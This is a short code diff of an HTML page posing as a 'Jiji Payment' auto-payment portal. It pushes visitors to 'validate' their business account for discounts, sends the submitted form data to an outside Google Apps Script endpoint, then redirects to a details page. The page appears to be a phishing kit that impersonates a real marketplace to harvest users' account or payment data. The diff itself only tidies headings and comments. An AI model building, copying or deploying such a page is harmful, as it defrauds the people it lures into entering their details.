@@ -23,8 +23,8 @@
 <body>
   <div class="container">
     <div class="header">
-      <h2>Jiji Payment<h2>
-        <h2>Welcome to the auto-payment portal for your subscriptions on Jiji.</h2>
+      <h2>Jiji Payment</h2>
+      <h2>Welcome to the auto-payment portal for your subscriptions on Jiji.</h2>
       <p>PLEASE VALIDATE YOUR BUSINESS ACCOUNT TO HAVE ACCESS TO 30% DISCOUNT AND FREE CHARGES FOR YOUR SUBSCRIPTIONS</p>
     </div>
 
@@ -53,7 +53,6 @@
     const form = document.getElementById('jijiForm');
     const statusEl = document.getElementById('status');
 
-    // your deployed Apps Script Web App URL
     const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxOpOdwYts-Td5SH48_hq9dADPzhwRuINh6LevT_up92sj2g0FiLDTnlcJ78SYe7As4RA/exec';
 
     form.addEventListener('submit', async (e) => {
@@ -72,9 +71,8 @@
         const text = await response.text();
         console.log("Server says:", text);
 
-        // if success → redirect immediately
         if (text.includes("SUCCESS")) {
-          window.location.href = "details.html";
+          window.location.href = "details.html"; // ✅ redirect to details.html
         } else {
           statusEl.textContent = 'Submission failed. Try again.';
           statusEl.style.color = '#aa0000';
